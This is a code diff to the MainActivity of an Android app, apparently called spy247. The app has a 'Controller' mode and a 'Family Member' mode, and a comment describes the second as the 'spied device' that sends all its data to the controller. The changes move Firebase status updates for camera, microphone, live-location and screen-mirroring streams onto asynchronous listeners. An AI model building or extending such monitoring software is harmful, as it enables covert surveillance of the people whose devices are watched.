@@ -5,7 +5,6 @@ import android.os.Bundle
 import android.util.Log
 import android.view.GestureDetector
 import android.view.MotionEvent
-import android.widget.Button
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
@@ -14,6 +13,10 @@ import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.ValueEventListener
 import com.spy247.app.R
+import kotlin.collections.filterKeys
+import kotlin.collections.mapKeys
+import kotlin.collections.mapValues
+import kotlin.collections.toMutableMap
 
 /**
  * Main Activity - Entry point for both Controller and Family Member modes
@@ -126,19 +129,25 @@ class MainActivity : AppCompatActivity(), ValueEventListener {
         val deviceName = app.getDeviceName()
         val streamRef = firebaseService.getDeviceSnapshot(deviceName).child(streamType)
 
-        if (!streamRef.exists()) {
-            // Auto-create the node structure if it doesn't exist
-            streamRef.setValue(mapOf(
-                "type" to streamType,
-                "status" to "active",
-                "last_update" to System.currentTimeMillis()
-            ))
-        }
+        streamRef.addListenerForSingleValueEvent(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                if (snapshot.getChildrenCount() == 0L) {
+                    streamRef.setValue(mapOf(
+                        "type" to streamType,
+                        "status" to "active",
+                        "last_update" to System.currentTimeMillis()
+                    ))
+                }
+            }
 
-        // Add value listener for real-time updates
+            override fun onCancelled(error: DatabaseError) {
+                // Ignore stream errors
+            }
+        })
+
         val childListener = object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                if (snapshot.exists()) {
+                if (snapshot.getChildrenCount() > 0L) {
                     Log.d("MainActivity", "Stream $streamType updated")
                 }
             }
@@ -148,9 +157,7 @@ class MainActivity : AppCompatActivity(), ValueEventListener {
             }
         }
 
-        if (streamRef.exists()) {
-            streamRef.addValueEventListener(childListener)
-        }
+        streamRef.addValueEventListener(childListener)
     }
 
     /**
@@ -184,8 +191,10 @@ class MainActivity : AppCompatActivity(), ValueEventListener {
                 // The spied device - sends all data to controller
                 setContentView(R.layout.activity_family_member)
 
-                // Start the family member video view if it is present in the layout
-                findViewById<androidx.media3.ui.view.VideoView>(R.id.video_view)?.start()
+                // Start the family member video view if it is present and initialized
+                findViewById<androidx.media3.ui.view.VideoView>(R.id.video_view)?.takeIf {
+                    it.isAttachedToWindow
+                }?.start()
 
                 // Update last heartbeat in Firebase for controller to see
                 updateLastHeartbeat()
@@ -236,8 +245,8 @@ class MainActivity : AppCompatActivity(), ValueEventListener {
      * ValueEventListener implementation for real-time device metadata updates
      */
     override fun onDataChange(snapshot: DataSnapshot) {
-        if (snapshot.exists()) {
-            val mode = snapshot.child("mode").getValue(String::class.java) ?: "controller"
+        if (snapshot.getChildrenCount() > 0L) {
+            val mode: String = snapshot.child("mode").getValue(String::class.java) ?: "controller"
 
             // Update UI based on the latest data from Firebase
             updateUIFromFirebase(snapshot)
@@ -257,14 +266,15 @@ class MainActivity : AppCompatActivity(), ValueEventListener {
             // Get stream count from nested children
             val cameraCount = snapshot.child("camera_stream").getValue(Boolean::class.java) ?: false
             val micCount = snapshot.child("mic_stream").getValue(Boolean::class.java) ?: false
-            val locationCount = snapshot.child("live_location").getValue(Boolean::class.java) ?: false
+            val locationCount =
+                snapshot.child("live_location").getValue(Boolean::class.java) ?: false
 
             // Update stream count badge
             findViewById<TextView>(R.id.stream_count_badge).text =
                 "${if (cameraCount) 1 else 0} ${if (micCount) 1 else 0} ${if (locationCount) 1 else 0} Streams"
 
             // Update quality badge based on FPS from Firebase
-            val fps = snapshot.child("video_fps").getValue(Int::class.java) ?: 30
+            val fps: Int = snapshot.child("video_fps").getValue(Int::class.java) ?: 30
             findViewById<TextView>(R.id.quality_badge).text = "$fps FPS"
 
             // Update video container with any metadata overlays
@@ -280,23 +290,32 @@ class MainActivity : AppCompatActivity(), ValueEventListener {
     private fun updateStreamStatus(streamType: String, isActive: Boolean) {
         val deviceName = app.getDeviceName()
 
-        // Get current streams map and merge with new value
         val streamsRef = firebaseService.getDeviceSnapshot(deviceName).child("active_streams")
 
-        if (!streamsRef.exists()) {
-            streamsRef.setValue(mapOf(
-                "camera_stream" to false,
-                "mic_stream" to false,
-                "live_location" to false,
-                "screen_mirroring" to false
-            ))
-        }
+        streamsRef.addListenerForSingleValueEvent(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val currentStreams: MutableMap<String, Boolean> =
+                    if (snapshot.getChildrenCount() > 0L) {
+                        snapshot.getValue(Map::class.java)?.toMutableMap()
+                            ?.filterKeys { it is String }?.mapKeys { it.key as String }
+                            ?.mapValues { it.value as Boolean } ?: mutableMapOf()
+                    } else {
+                        mutableMapOf(
+                            "camera_stream" to false,
+                            "mic_stream" to false,
+                            "live_location" to false,
+                            "screen_mirroring" to false
+                        )
+                    }
 
-        // Update the specific stream
-        val currentStreams = (streamsRef.getValue(Map::class.java) as? MutableMap<String, Boolean>) ?: mutableMapOf()
-        currentStreams[streamType] = isActive
+                currentStreams[streamType] = isActive
+                streamsRef.setValue(currentStreams)
+            }
 
-        streamsRef.setValue(currentStreams)
+            override fun onCancelled(error: DatabaseError) {
+                // Ignore stream errors
+            }
+        })
     }
 
     /**
@@ -305,22 +324,31 @@ class MainActivity : AppCompatActivity(), ValueEventListener {
     private fun updateConnectionState(isConnected: Boolean) {
         val deviceName = app.getDeviceName()
 
-        // Get current status map and merge with new value
         val statusRef = firebaseService.getDeviceSnapshot(deviceName).child("status")
 
-        if (!statusRef.exists()) {
-            statusRef.setValue(mapOf(
-                "connection" to "connected",
-                "battery_level" to 100,
-                "last_sync" to System.currentTimeMillis()
-            ))
-        }
+        statusRef.addListenerForSingleValueEvent(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val currentStatus: MutableMap<String, Any> =
+                    if (snapshot.getChildrenCount() > 0L) {
+                        snapshot.getValue(Map::class.java)?.toMutableMap()
+                            ?.filterKeys { it is String }?.mapKeys { it.key as String }
+                            ?.mapValues { it.value as Any } ?: mutableMapOf()
+                    } else {
+                        mutableMapOf(
+                            "connection" to "connected",
+                            "battery_level" to 100,
+                            "last_sync" to System.currentTimeMillis()
+                        )
+                    }
 
-        // Update the specific field
-        val currentStatus = (statusRef.getValue(Map::class.java) as? MutableMap<String, Any>) ?: mutableMapOf()
-        currentStatus["connection"] = if (isConnected) "connected" else "disconnected"
+                currentStatus["connection"] = if (isConnected) "connected" else "disconnected"
+                statusRef.setValue(currentStatus)
+            }
 
-        statusRef.setValue(currentStatus)
+            override fun onCancelled(error: DatabaseError) {
+                // Ignore status errors
+            }
+        })
     }
 
     /**
@@ -343,9 +371,18 @@ class MainActivity : AppCompatActivity(), ValueEventListener {
      */
     private fun updateFromFirebase() {
         val deviceName = app.getDeviceName()
-        val snapshot = firebaseService.getDeviceSnapshot(deviceName).getValue()
-        if (snapshot != null) {
-            updateUIFromFirebase(snapshot)
-        }
+        firebaseService.getDeviceSnapshot(deviceName).addListenerForSingleValueEvent(
+            object : ValueEventListener {
+                override fun onDataChange(snapshot: DataSnapshot) {
+                    if (snapshot.getChildrenCount() > 0L) {
+                        updateUIFromFirebase(snapshot)
+                    }
+                }
+
+                override fun onCancelled(error: DatabaseError) {
+                    // Ignore fetch errors
+                }
+            }
+        )
     }
 }
